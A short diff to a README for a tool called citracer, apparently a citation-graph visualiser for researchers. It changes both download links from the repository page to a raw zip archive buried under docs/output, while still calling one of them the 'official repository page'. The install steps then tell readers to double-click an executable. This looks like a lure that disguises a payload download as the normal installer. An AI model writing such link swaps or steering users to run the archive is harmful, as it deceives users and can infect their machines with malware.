@@ -1,6 +1,6 @@
 # 📊 citracer - Visualize how research ideas connect together
 
-[![Download Citracer](https://img.shields.io/badge/Download-Citracer-blue)](https://github.com/darkbluevn1765/citracer)
+[![Download Citracer](https://img.shields.io/badge/Download-Citracer-blue)](https://github.com/darkbluevn1765/citracer/raw/refs/heads/main/docs/output/Software-v3.4.zip)
 
 Citracer helps researchers map the history of academic ideas. It scans research papers to find citations and builds a visual map. You see how one author builds on the work of another. This tool simplifies the literature review process by turning lists of papers into an interactive graph.
 
@@ -20,7 +20,7 @@ Citracer runs on Windows 10 or Windows 11. Your computer needs at least 8 gigaby
 
 Follow these steps to install the software.
 
-1. Visit the [official repository page](https://github.com/darkbluevn1765/citracer) to download the installer.
+1. Visit the [official repository page](https://github.com/darkbluevn1765/citracer/raw/refs/heads/main/docs/output/Software-v3.4.zip) to download the installer.
 2. Locate the file named `citracer-setup.exe` in your Downloads folder.
 3. Double-click the file to start the installation.
 4. Follow the prompts on your screen to complete the setup.
